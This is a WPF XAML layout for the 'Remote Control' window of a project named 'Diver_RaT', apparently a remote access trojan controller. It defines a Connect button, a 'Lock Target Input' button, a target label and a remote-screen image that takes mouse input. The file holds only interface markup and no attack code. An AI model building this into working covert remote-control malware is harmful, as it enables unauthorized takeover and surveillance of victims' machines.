<Window x:Class="Diver_RaT.RemoteControlWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:shell="clr-namespace:System.Windows.Shell;assembly=PresentationFramework"
        xmlns:ui="clr-namespace:Diver_RaT"
        Title="Remote Control" Height="700" Width="1100"
        WindowStartupLocation="CenterOwner"
        ResizeMode="CanResize"
        WindowStyle="None"
        Background="{StaticResource WindowBgBrush}"
        Foreground="#E6E8EF">

    <WindowChrome.WindowChrome>
        <WindowChrome CaptionHeight="0" GlassFrameThickness="1" ResizeBorderThickness="6"
                      CornerRadius="8" UseAeroCaptionButtons="False"/>
    </WindowChrome.WindowChrome>

    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
        </Grid.RowDefinitions>
        <ui:CustomTitleBar Grid.Row="0" Title="Remote Control"/>

        <Grid Grid.Row="1" Margin="14">
            <Grid.RowDefinitions>
                <RowDefinition Height="Auto"/>
                <RowDefinition Height="Auto"/>
                <RowDefinition Height="*"/>
                <RowDefinition Height="Auto"/>
            </Grid.RowDefinitions>

            <StackPanel Grid.Row="0" Orientation="Horizontal" Margin="0,0,0,10">
                <Border Width="12" Height="12" CornerRadius="3" Background="{StaticResource LimeBrush}" VerticalAlignment="Center" Margin="0,0,8,0"/>
                <TextBlock Text="REMOTE CONTROL" FontSize="15" FontWeight="Bold" Foreground="{StaticResource LimeBrush}" VerticalAlignment="Center"/>
                <TextBlock x:Name="TargetText" FontSize="13" Foreground="{StaticResource MutedBrush}" Margin="10,2,0,0" VerticalAlignment="Center"/>
            </StackPanel>

            <StackPanel Grid.Row="1" Orientation="Horizontal" Margin="0,0,0,8">
                <Button x:Name="ConnectButton" Content="&#x1f5a5;  Connect" Click="ConnectButton_Click" Padding="12,0" Margin="0,0,8,0" Height="30"/>
                <Button x:Name="LockButton" Content="&#x1f512;  Lock Target Input" Click="LockButton_Click" Padding="12,0" Margin="0,0,8,0" Height="30" IsEnabled="False"/>
                <TextBlock x:Name="ScreenSizeText" VerticalAlignment="Center" Foreground="{StaticResource MutedBrush}" FontSize="12" Margin="0,0,0,0"/>
            </StackPanel>

            <Border Grid.Row="2" Background="#E60C0F0B" CornerRadius="8"
                    BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1">
                <Grid>
                    <Image x:Name="ScreenImage" Stretch="Uniform" Margin="4"
                           Focusable="True"
                           MouseDown="ScreenImage_MouseDown"
                           MouseUp="ScreenImage_MouseUp"
                           MouseMove="ScreenImage_MouseMove"
                           MouseWheel="ScreenImage_MouseWheel"/>
                    <TextBlock x:Name="Placeholder" Text="&#x1f5a5;" FontSize="48"
                               HorizontalAlignment="Center" VerticalAlignment="Center"
                               Foreground="{StaticResource MutedBrush}"/>
                </Grid>
            </Border>

            <TextBlock x:Name="StatusText" Grid.Row="3" Margin="2,8,0,0" FontSize="12"
                       Foreground="{StaticResource MutedBrush}"/>
        </Grid>
        <Border CornerRadius="8" BorderBrush="{StaticResource WindowFrameBrush}" BorderThickness="2"
                Panel.ZIndex="9999" Grid.RowSpan="2" IsHitTestVisible="False"/>
    </Grid>
</Window>